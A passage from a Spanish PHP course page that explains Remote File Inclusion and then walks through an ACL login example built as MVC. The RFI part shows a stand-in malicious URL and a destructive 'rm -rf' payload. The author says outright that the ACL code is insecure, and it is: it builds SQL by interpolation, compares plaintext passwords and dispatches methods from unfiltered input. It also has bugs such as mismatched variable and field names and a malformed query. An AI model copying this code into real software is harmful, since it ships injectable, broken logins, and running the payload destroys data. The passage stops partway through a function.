+<p>Imagina, como antes, un programa PHP que haga un <em>include()</em> tan común como este:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span> <span class="p">(</span><span class="nv">$viewName</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Imagina también que este código se invoque normalmente mediante una petición del estilo: https://sitio-confiable.com?view=main.php. O algo parecido. Es una estrategia habitual en muchas aplicaciones web.</p>
+
+<p>Pues bien, un atacante podría pedir la siguiente URL: https://sitio-confiable.com?view=https://sitio-malicioso/soy-un-script-malvado.php</p>
+
+<p>Es decir, ha colocado como <em>$viewName</em> la URL de un programa PHP externo a nuestro servidor, y nuestro programa hará un <em>include()</em> de ese código tan feliz y contento, sin saber que se trata de código malicioso que acabará directamente en las tripas de nuestro programa.</p>
+
+<p>Una vez que <em>soy-un-script-malvado.php</em> se esté ejecutando en el servidor <em>sitio-confiable.com</em>, puede hacer cosas terribles, como, por ejemplo, esta:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="nb">system</span><span class="p">(</span><span class="s2">"rm -rf"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>(No te digo lo que hace ese comando por si se te ocurre probarlo, pero ya te adelanto que no es agradable).</p>
+
+<p>Para prevenir los ataques por RFI, algunas estrategias válidas son:</p>
+
+<ul>
+  <li><strong>No confiar en los datos</strong> que no provengan de nuestro sistema.</li>
+  <li><strong>Validar y filtrar los datos</strong> que introduce el usuario (sí, otra vez: validar, validar y validar cualquier cosa que provenga del usuario).</li>
+</ul>
+
+<h2 id="35-caso-práctico-resuelto-autenticación-mediante-acl">3.5. Caso práctico resuelto: autenticación mediante ACL</h2>
+
+<p>En esta sección, vamos a poner en práctica muchas de las cosas que hemos visto en este tema mediante un caso práctico realista y completamente resuelto.</p>
+
+<p>Completamente resuelto pero mejorable, porque una aplicación informática <em>siempre</em> se puede mejorar.</p>
+
+<p>De hecho, en la siguiente sección afrontaremos varias mejoras que tendrás que intentar tú en forma de ejercicios propuestos. ¿O pensabas que iba a hacer yo todo el trabajo?</p>
+
+<h3 id="351-qué-es-la-autenticación-mediante-acl">3.5.1. Qué es la autenticación mediante ACL</h3>
+
+<p>Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios. El más completo de esos subsistemas es el de las <strong>lisas de control de acceso</strong> (ACL = Access Control List).</p>
+
+<p>Ese subsistema suele estar basado en este diseño de base de datos:</p>
+
+<p><img src="/docs/dwes/_site/assets/images/03-acl.jpg" alt="Tablas ACL" /></p>
+
+<p>Esto significa que necesitamos <strong>cinco tablas</strong> para implementar un ACL completo.</p>
+
+<p>Sin embargo, muchas veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, añadiendo quizá un campo “tipo”).</p>
+
+<p><strong>Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando.</strong></p>
+
+<p>En cualquier caso, es conveniente que conozcas el esquema ACL completo (es decir, el de 5 tablas) para que lo pongas en práctica cuando lo necesites. Por eso te lo he presentado. Ahora ya sois oficialmente amigos.</p>
+
+<h3 id="352-una-implementación-de-autenticación-mediante-acl">3.5.2. Una implementación de autenticación mediante ACL</h3>
+
+<p>Como ocurre con muchos conceptos en el ámbito de la programación, las ACL se entienden mejor viéndolas que explicándolas. Así que vamos a hacer una implementación de ejemplo, que de paso nos servirá para mostrar en acción muchas de las cosas que hemos visto en este tema.</p>
+
+<p>Ojo, que esta es solo <em>una de las posibles implementaciones</em>. Pueden existir mil variaciones. Pero, como sucedía con los ejemplos que hemos visto anteriormente, te servirá como base para tu propia implementación de una ACL.</p>
+
+<p><strong>IMPORTANTE</strong>: en esta implementación verás una distribución de archivos un poco peculiar y que, a primera vista, puede resultarte hasta caprichosa. No te agobies. Hemos respetado una arquitectura de aplicaciones denominada <strong><em>modelo-vista-controlador</em></strong> o <strong><em>MVC</em></strong>. Hablaremos largo y tendido sobre esa arquitectura más adelante, y entonces comprenderás que la distribución del código no tenía nada de caprichosa.</p>
+
+<p>Por ahora, solo tienes que seguir la pista a lo que sucede, y ni siquiera es necesario que lo entiendas al 100%. Un 80% ya estaría genial. Un 50% sería suficiente. Tu comprensión de este código aumentará cuando tengas que utilizarlo y adaptarlo a tus propios proyectos.</p>
+
+<h4 id="nuestras-tablas-acl">Nuestras tablas ACL</h4>
+
+<p>Vamos a suponer que esta autenticación con ACL se está implementando para un sistema de publicación de noticias (un blog, un periódico digital o algo semejante). Solo por darle un poco de contexto. Realmente, cambiando los permisos, podría utilizarse casi para cualquier web.</p>
+
+<p>Haremos una implementación completa del ACL, es decir, con las cinco tablas. Esas cinco tablas tendrán el siguiente aspecto (te muestro algunos datos de ejemplo para que quede más claro de lo que estamos hablando):</p>
+
+<p><strong>TABLA USUARIOS</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>IdUsuario</th>
+      <th>Email</th>
+      <th>Passwd</th>
+      <th>Nombre</th>
+      <th>Telef</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>jp@gmail.com</td>
+      <td>sgsdfgjk8yias</td>
+      <td>Juan Pérez</td>
+      <td>600 230 xxx</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>ms@gmail.com</td>
+      <td>239ywds9$</td>
+      <td>María Sánchez</td>
+      <td>700 398 yyy</td>
+    </tr>
+    <tr>
+      <td>Etc</td>
+      <td>Etc</td>
+      <td>Etc</td>
+      <td>Etc</td>
+      <td>Etc</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>TABLA ROLES</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>IdRol</th>
+      <th>Descripcion</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Administrador</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Editor</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Usuario</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>TABLA USUARIOS-ROLES</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>IdUsuario</th>
+      <th>IdRol</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>1</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>3</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>2</td>
+    </tr>
+    <tr>
+      <td>etc</td>
+      <td>etc</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>TABLA PERMISOS</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>IdPermiso</th>
+      <th>Descripcion</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Crear contenido nuevo</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Editar contenido propio</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Editar contenido ajeno</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>Borrar contenido propio</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>Borrar contenido ajeno</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>Publicar contenido propio</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>Publicar contenido ajeno</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>Leer contenido publicado</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>TABLA ROLES-PERMISOS</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>IdRol</th>
+      <th>IdPermiso</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>1</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>2</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>3</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>4</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>5</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>6</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>7</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>8</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>1</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>2</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>6</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>8</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>8</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Observa que, con estas tablas, queda perfectamente definido a qué perfil de usuario (o “rol”) pertenece cada usuario y qué cosas puede hacer con ese perfil.</p>
+
+<p>Por ejemplo, el usuario Juan Pérez, que tiene el Id = 1, es un Administrador, porque tiene asociado el rol 1 en la tabla <em>usuarios-roles</em>. Y los administradores tienen permiso para hacerlo absolutamente todo, según se desprende de la tabla <em>roles-permisos</em>.</p>
+
+<p>En cambio, la usuaria María Sánchez (Id = 2) tiene perfil de Editor, y los editores solo tienen permiso para cuatro operaciones: Crear contenido nuevo, Editar su propio contenido, Publicar su propio contenido y Leer el contenido publicado.</p>
+
+<h4 id="código-fuente-de-nuestra-implementación">Código fuente de nuestra implementación</h4>
+
+<p>En esta implementación, no escribiremos el código para hacer cosas como “Crear contenido nuevo” o “Publicar contenido”. Eso dependerá del sistema concreto que estemos programando, y no es lo que nos interesa ahora.</p>
+
+<p>Lo que nos interesa es ver cómo se autentica un usuario en una aplicación web y cómo se le puede dar acceso a unas funcionalidades o a otras dependiendo del contenido de las tablas ACL.</p>
+
+<p>Una vez autenticado, el usuario accederá a una vista diferente de la aplicación dependiendo de sus privilegios, donde se le mostrarán las opciones de que dispone. Es decir, si el usuario que se loguea es Juan Pérez, que tiene rol de Administrador, la aplicación debe mostrarle estas opciones:</p>
+
+<ul>
+  <li>Editar contenido (propio y ajeno)</li>
+  <li>Borrar contenido (propio y ajeno)</li>
+  <li>Publicar contenido (propio y ajeno)</li>
+  <li>Leer contenido</li>
+  <li>Crear contenido</li>
+</ul>
+
+<p>En cambio, si se loguea María Sánchez, que tiene perfil de Editor, las opciones deben reducirse a:</p>
+
+<ul>
+  <li>Editar contenido (propio)</li>
+  <li>Publicar contenido (propio)</li>
+  <li>Leer contenido</li>
+  <li>Crear contenido</li>
+</ul>
+
+<p><strong>Insisto en una idea muy importante</strong>: no es necesario que comprendas la totalidad de este código en este momento. Basta con que te esfuerces en captar la idea general. Volverás sobre él, y sobre infinitas variedades de él, más adelante, cada vez con mayor comprensión de lo que está sucediendo. Así que léelo sin prisa y sin agobios, como quien se adentra en la traducción de un texto escrito en una lengua que se parece un poco a la suya sin llegar a serlo.</p>
+
+<p>Una última advertencia: esta solución presenta algunos problemas de seguridad (como no filtrar las variables procedentes de un formulario) que resolveremos en los ejercicios propuestos más adelante.</p>
+
+<p><strong>Archivo index.php</strong></p>
+
+<p>Este archivo captura la variable <em>action</em> desde la URL. Esta variable, como ya vimos en el ejemplo de la Biblioteca, indica a la aplicación qué es lo que debe hacer.</p>
+
+<p>Luego se instancia un objeto de tipo <em>Controller</em> y se invoca un método con el mismo nombre que la <em>action</em>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="k">include</span><span class="p">(</span><span class="s2">"controller.php"</span><span class="p">);</span>
+  <span class="nv">$controller</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Controller</span><span class="p">();</span>
+
+  <span class="c1">// Miramos a ver si hay alguna acción pendiente de realizar</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="c1">// No la hay. Usamos la acción por defecto (mostrar el formulario de login)</span>
+    <span class="nv">$action</span> <span class="o">=</span> <span class="s2">"showLoginForm"</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="c1">// Sí la hay. La recuperamos.</span>
+    <span class="nv">$action</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'action'</span><span class="p">];</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Ejecutamos el método del controlador que se llame como la acción</span>
+  <span class="nv">$controlador</span><span class="o">-&gt;</span><span class="nv">$action</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>CONTROLADOR (archivo controller.php)</strong></p>
+
+<p>En el controlador están reflejadas todas las posibles acciones que puede realizar la aplicación.</p>
+
+<p>Es decir, tiene que haber un método por cada posible valor de la variable <em>action</em>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">start_session</span><span class="p">();</span>    <span class="c1">// Si no se ha hecho en el index, claro</span>
+
+    <span class="kd">class</span> <span class="nc">Controller</span> <span class="p">{</span>
+
+        <span class="k">private</span> <span class="nv">$view</span><span class="p">,</span> <span class="nv">$user</span><span class="p">;</span>
+
+        <span class="cd">/**
+         * Constructor. Crea el objeto vista y los modelos
+         */</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span> <span class="o">=</span> <span class="k">New</span> <span class="nc">View</span><span class="p">();</span>       <span class="c1">// Vistas</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span> <span class="o">=</span> <span class="k">New</span> <span class="nc">User</span><span class="p">();</span>       <span class="c1">// Modelo de usuarios</span>
+        <span class="p">}</span>
+
+        <span class="cd">/**
+         * Muestra el formulario de login
+         */</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="n">showLoginForm</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"loginForm"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="cd">/**
+         * Procesa el formulario de login y, si es correcto, inicia la sesión con el id del usuario.
+         * Redirige a la vista de selección de rol.
+         */</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="n">processLoginForm</span><span class="p">()</span> <span class="p">{</span>
+
+            <span class="c1">// Validación del formulario</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">||</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
+                <span class="c1">// Algún campo del formulario viene vacío: volvemos a mostrar el login</span>
+                <span class="nv">$data</span><span class="p">[</span><span class="s1">'errorMsg'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"El email y la contraseña son obligatorios"</span><span class="p">;</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"loginForm"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+                <span class="c1">// Hemos pasado la validación del formulario: vamos a procesarlo</span>
+                <span class="nv">$userData</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">checkLogin</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$userData</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="c1">// Login correcto: creamos la sesión y pedimos al usuario que elija su rol</span>
+                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'idUser'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$userData</span><span class="o">-&gt;</span><span class="n">idUser</span><span class="p">;</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">SelectUserRolForm</span><span class="p">();</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$data</span><span class="p">[</span><span class="s1">'errorMsg'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Usuario o contraseña incorrectos"</span><span class="p">;</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"loginForm"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="cd">/**
+         * Muestra formulario de selección de rol de usuario
+         */</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="n">selectUserRolForm</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nv">$data</span><span class="p">[</span><span class="s1">'roles'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">getUserRoles</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'idUser'</span><span class="p">]);</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"selectUserRolForm"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+            <span class="c1">// Posible mejora: si el usuario solo tiene un rol, la aplicación podría seleccionarlo automáticamnte</span>
+            <span class="c1">// y saltar a $this-&gt;showMainMenu()</span>
+        <span class="p">}</span>
+
+        <span class="cd">/**
+         * Procesa el formulario de selección de rol de usuario y crea una variable de sesión para almacenarlo.
+         * Redirige al menú principal.
+         */</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="n">processSelectUserRolForm</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userRol'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'userRol'</span><span class="p">];</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">showMainMenu</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="cd">/**
+         * Muestra el menú de opciones del usuario según la tabla de persmisos
+         */</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="n">showMainMenu</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nv">$data</span><span class="p">[</span><span class="s1">'permissions'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">user</span><span class="o">-&gt;</span><span class="nf">getUserPermissions</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userRol'</span><span class="p">]);</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">view</span><span class="o">-&gt;</span><span class="nf">show</span><span class="p">(</span><span class="s2">"mainMenu"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>VISTA (view.php)</strong></p>
+
+<p>Este archivo contiene un método genérico (dentro de la clase View) para mostrar cualquier otra vista, cuyo nombre se le pasa como parámetro desde el controlador.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">class</span> <span class="nc">View</span> <span class="p">{</span>
+		<span class="k">public</span> <span class="k">function</span> <span class="n">mostrar</span><span class="p">(</span><span class="nv">$nombreVista</span><span class="p">,</span> <span class="nv">$data</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">include_once</span><span class="p">(</span><span class="s2">"views/header.php"</span><span class="p">);</span>
+			<span class="k">include_once</span><span class="p">(</span><span class="s2">"views/</span><span class="nv">$nombreVista</span><span class="s2">.php"</span><span class="p">);</span>
+			<span class="k">include_once</span><span class="p">(</span><span class="s2">"views/footer.php"</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>VISTA loginForm (archivo views/loginForm.php)</strong></p>
+
+<p>Esta vista muestra el formulario de login. La dejamos preparada para mostrar, opcionalmente, un mensaje de error (del tipo “usuario o contraseña incorrectos”) o un mensaje informativo (del tipo “Sesión cerrada con éxito”).</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'errorsMsg'</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;p style='color:red'&gt;"</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'msjError'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'infoMsg'</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;p style='color:blue'&gt;"</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'msjInfo'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"&lt;/p&gt;"</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">echo</span> <span class="s2">"&lt;form action='index.php'&gt;
+                Usuario:&lt;input type='text' name='usr'&gt;&lt;br&gt;
+                Contraseña:&lt;input type='password' name='pass'&gt;&lt;br&gt;
+                &lt;input type='hidden' name='action' value='processLoginForm'&gt;
+                &lt;input type='submit'&gt;
+             &lt;/form&gt;"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><strong>VISTA selectUserRolForm (archivo views/selectUserRolForm.php)</strong></p>
+
+<p>Esta vista muestra la lista de roles de un usuario. Sirve por si un usuario tiene asignado más de un rol. Así, antes de terminar el login, podrá elegir con qué rol quiere ingresar en la aplicación.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">echo</span> <span class="s2">"Selecciona el rol&lt;br&gt;"</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">"&lt;form action='index.php'&gt;"</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">"&lt;select name='idRol'&gt;"</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'roles'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$rol</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;option value='"</span><span class="mf">.</span><span class="nv">$rol</span><span class="o">-&gt;</span><span class="n">idRol</span><span class="mf">.</span><span class="s2">"'&gt;"</span><span class="mf">.</span><span class="nv">$rol</span><span class="o">-&gt;</span><span class="n">description</span><span class="mf">.</span><span class="s2">"&lt;option&gt;"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s2">"&lt;input type='hidden' name='action' value='processSelectUserRolForm"</span>
+        <span class="k">echo</span> <span class="s2">"&lt;input type='submit'&gt;"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><strong>VISTA mainMenu (archivo views/mainMenu.php)</strong></p>
+
+<p>Esta vista muestra las opciones del programa asociadas a un usuario concreto. Cada opción es un enlace a la propia aplicacion con un valor diferente para la variable <em>action</em>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">echo</span> <span class="s2">"Menú principal&lt;br&gt;"</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'permissions'</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$permission</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"&lt;a href='index.php?action="</span><span class="mf">.</span><span class="nv">$permission</span><span class="o">-&gt;</span><span class="n">action</span><span class="mf">.</span><span class="s2">"&gt;"</span><span class="mf">.</span><span class="nv">$permission</span><span class="o">-&gt;</span><span class="n">description</span><span class="mf">.</span><span class="s2">"&lt;/a&gt;&lt;br&gt;"</span><span class="p">;</span>
+        <span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>MODELO (archivo user.php)</strong></p>
+
+<p>El modelo contiene todos los métodos necesarios para acceder a la base de datos (o, en general, a cualquier recurso del servidor). Esos métodos siempre se invocan desde el controlador.</p>
+
+<p>En este caso, llamamos <em>user.php</em> al modelo porque accederá únicamente a la tabla de usuarios.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kd">class</span> <span class="nc">User</span> <span class="p">{</span>
+
+        <span class="k">private</span> <span class="nv">$db</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
+           <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="s2">"db-host"</span><span class="p">,</span> <span class="s2">"db-user"</span><span class="p">,</span> <span class="s2">"db-password"</span><span class="p">,</span> <span class="s2">"db-name"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">checkLogin</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT idUser FROM users WHERE email = '</span><span class="nv">$email</span><span class="s2">' AND password = '</span><span class="nv">$pass</span><span class="s2">'"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$usuario</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_object</span><span class="p">();</span>
+                    <span class="k">return</span> <span class="nv">$usuario</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">getUserRoles</span><span class="p">(</span><span class="nv">$idUser</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$resultArray</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT roles.* FROM roles
+                                            INNER JOIN user_roles ON roles.id = user_roles.idRol
+                                            WHERE user_roles.idUser = '</span><span class="nv">$idUser</span><span class="s2">'"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">while</span> <span class="p">(</span><span class="nv">$rol</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_object</span><span class="p">())</span> <span class="p">{</span>
+                        <span class="nv">$resultArray</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$rol</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+            <span class="p">}</span>
+
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">getUserPermissions</span><span class="p">(</span><span class="nv">$idRol</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$resultArray</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT permissions.* FROM permissions 
+                                            INNER JOIN roles_permissions ON permissions.id = roles_permissions.idPermissionWHERE idUser = '</span><span class="nv">$idUser</span><span class="s2">'
+                                            WHERE roles_permissions.idRol = '</span><span class="nv">$idRol</span><span class="s2">'"</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
